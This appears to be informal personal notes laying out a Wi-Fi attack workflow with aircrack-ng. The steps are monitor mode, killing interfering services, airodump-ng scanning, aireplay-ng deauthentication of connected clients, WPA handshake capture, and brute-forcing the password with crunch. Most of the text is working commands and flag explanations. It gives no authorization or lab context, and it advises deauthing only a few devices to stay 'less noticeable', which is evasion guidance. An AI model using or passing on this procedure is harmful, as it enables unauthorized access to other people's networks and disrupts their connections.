# First, change wifi card to monitor (wlp6s0 can be replaced with interface name)
ifconfig wlp6s0 (interface) down
iwconfig wlp6s0 mode monitor
ifconfig wlp6s0 up

# Then, setup to work with aircrack
airmon-ng check wlp6s0 (interface)

# Get rid of any service interfering, for avahi-daemon might need to use systemctl stop avahi-daemon.service

kill PID etc

kill netmanage first usually

# Then, use airodump to scan interface for all connections seen

airodump-ng wlp6s0

# Top box will show any AP within your device that you could connect to, then lower one shows individual devices that may be possible connected to one of the AP's listed above

# After scan, use airodump again for more specific scan

airodump-ng -c 1-11 -w file --bssid address here interface

c=channel you want to scan to find specific routers using such channel
w=can write to a file
--bssid=the bssid of router
then put in the interface once again

# After scan, use aireplay-ng to deauth devices, a good idea would be to only deauth a couple of devices instead of everything connected to the router and make it less noticeable

ex. aireplay-ng -0 # -a BSSID

-0= enter in a number to specifiy how many times or seconds to run the deathuentication. Using 0 for the number will run this infinitely until stopped
-a= the address or BSSID of router
use interface at end again

# Use program running until your see the handshake has been created while using the airodump scan in separate tab. Can stop deauth, then the capture of airodump will display WPA handshake soon enough

# Then look at file

So,
airmon - use to check initial stuff
airodump - use to scan
aireplay - use to deauth/attack
aircrack - use with crunch to brute passwrd with capture file
